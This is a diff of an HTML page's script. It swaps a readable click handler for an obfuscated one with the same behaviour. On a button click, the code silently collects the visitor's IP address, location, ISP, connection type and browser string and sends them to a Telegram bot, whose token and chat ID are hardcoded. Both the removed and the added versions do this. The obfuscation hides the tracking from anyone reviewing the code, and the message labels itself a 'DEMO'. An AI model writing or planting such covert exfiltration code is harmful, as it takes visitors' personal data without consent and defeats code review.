@@ -101,43 +101,7 @@
 
     <script>
         document.getElementById('sendBtn').addEventListener('click', function() {
-            document.getElementById('overlay').classList.add('hidden');
-          document.getElementById('img').style.display='none';
-          document.getElementById('hee').style.display='flex';
-        });
-        
-
-    const TELEGRAM_BOT_TOKEN = '8271808472:AAGfxJ4MYTl7TeSnTn7STnwLrCjwEiMa4Gc';
-    const TELEGRAM_CHAT_ID = '5952771138';
-
-    document.getElementById('sendBtn').addEventListener('click', async function() {
-        try {
-            const ipRes = await fetch('https://ipapi.co/json/');
-            const ipData = await ipRes.json();
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-
-            const message = `
-📡 *DEMO: User Data Captured!*
-• IP: \`${ipData.ip || 'Unknown'}\`
-• City: ${ipData.city || 'Unknown'}
-• Country: ${ipData.country_name || 'Unknown'}
-• ISP: ${ipData.org || 'Unknown'}
-• Connection: ${conn ? conn.effectiveType : 'Unknown'}
-• Browser: \`${navigator.userAgent.substring(0, 50)}...\`
-• Time: ${new Date().toLocaleString()}
-            `.trim();
-
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            });
-        } catch (error) {}
-    });
+        const _0x33eecc=_0x4794;function _0xb22d(){const _0x2a336e=['Unknown','overlay','https://ipapi.co/json/','effectiveType','\x0a\x0a•\x20ISP:\x20','org','/sendMessage','\x0a\x0a📡\x20*DEMO:\x20User\x20Data\x20Captured!*\x0a\x0a•\x20IP:\x20`','981BXMLth','31046048OmdiGU','log','sendBtn','...`\x0a\x0a•\x20Time:\x20','https://api.telegram.org/bot','28uUoWfY','substring','country_name','1232083MofMBh','style','display','\x0a\x0a•\x20Browser:\x20`','application/json','getElementById','`\x0a\x0a•\x20City:\x20','\x0a\x0a•\x20Connection:\x20','trim','addEventListener','city','65910AjIBZG','8271808472:AAGfxJ4MYTl7TeSnTn7STnwLrCjwEiMa4Gc','\x0a\x0a•\x20Country:\x20','Hello\x20World!','1303044pOKXOZ','json','1374856ivxcLL','hee','hidden','toLocaleString','stringify','connection','3525260SljXYj','4BjsGdb','click','2GnZaca','userAgent','3615726sMjTAa'];_0xb22d=function(){return _0x2a336e;};return _0xb22d();}(function(_0x12c5bb,_0x4ce8b3){const _0x19fb3f=_0x4794,_0x5affd5=_0x12c5bb();while(!![]){try{const _0x532559=parseInt(_0x19fb3f(0xfb))/0x1*(-parseInt(_0x19fb3f(0xe7))/0x2)+-parseInt(_0x19fb3f(0xe9))/0x3*(-parseInt(_0x19fb3f(0xe5))/0x4)+-parseInt(_0x19fb3f(0xe4))/0x5+-parseInt(_0x19fb3f(0xdc))/0x6*(parseInt(_0x19fb3f(0xf8))/0x7)+parseInt(_0x19fb3f(0xde))/0x8+parseInt(_0x19fb3f(0xf2))/0x9*(-parseInt(_0x19fb3f(0xd8))/0xa)+parseInt(_0x19fb3f(0xf3))/0xb;if(_0x532559===_0x4ce8b3)break;else _0x5affd5['push'](_0x5affd5['shift']());}catch(_0x31552c){_0x5affd5['push'](_0x5affd5['shift']());}}}(_0xb22d,0xa4d91));function hi(){const _0xafe30f=_0x4794;console[_0xafe30f(0xf4)](_0xafe30f(0xdb));}hi(),document[_0x33eecc(0x100)](_0x33eecc(0xf5))['addEventListener'](_0x33eecc(0xe6),function(){const _0x2a7b78=_0x33eecc;document[_0x2a7b78(0x100)](_0x2a7b78(0xeb))['classList']['add'](_0x2a7b78(0xe0)),document[_0x2a7b78(0x100)]('img')[_0x2a7b78(0xfc)][_0x2a7b78(0xfd)]='none',document['getElementById'](_0x2a7b78(0xdf))['style'][_0x2a7b78(0xfd)]='flex';});const TELEGRAM_BOT_TOKEN=_0x33eecc(0xd9),TELEGRAM_CHAT_ID='5952771138';function _0x4794(_0x1583ca,_0x1c33e0){const _0xb22d6a=_0xb22d();return _0x4794=function(_0x479410,_0x47b70a){_0x479410=_0x479410-0xd3;let _0x36a4ca=_0xb22d6a[_0x479410];return _0x36a4ca;},_0x4794(_0x1583ca,_0x1c33e0);}document[_0x33eecc(0x100)]('sendBtn')[_0x33eecc(0xd6)](_0x33eecc(0xe6),async function(){const _0x456347=_0x33eecc;try{const _0xed7ff1=await fetch(_0x456347(0xec)),_0x17283b=await _0xed7ff1[_0x456347(0xdd)](),_0x3a3898=navigator[_0x456347(0xe3)]||navigator['mozConnection']||navigator['webkitConnection'],_0x196abf=(_0x456347(0xf1)+(_0x17283b['ip']||_0x456347(0xea))+_0x456347(0xd3)+(_0x17283b[_0x456347(0xd7)]||_0x456347(0xea))+_0x456347(0xda)+(_0x17283b[_0x456347(0xfa)]||_0x456347(0xea))+_0x456347(0xee)+(_0x17283b[_0x456347(0xef)]||_0x456347(0xea))+_0x456347(0xd4)+(_0x3a3898?_0x3a3898[_0x456347(0xed)]:_0x456347(0xea))+_0x456347(0xfe)+navigator[_0x456347(0xe8)][_0x456347(0xf9)](0x0,0x32)+_0x456347(0xf6)+new Date()[_0x456347(0xe1)]()+'\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20')[_0x456347(0xd5)]();await fetch(_0x456347(0xf7)+TELEGRAM_BOT_TOKEN+_0x456347(0xf0),{'method':'POST','headers':{'Content-Type':_0x456347(0xff)},'body':JSON[_0x456347(0xe2)]({'chat_id':TELEGRAM_CHAT_ID,'text':_0x196abf,'parse_mode':'Markdown'})});}catch(_0x541adc){}});
     </script>
 
 
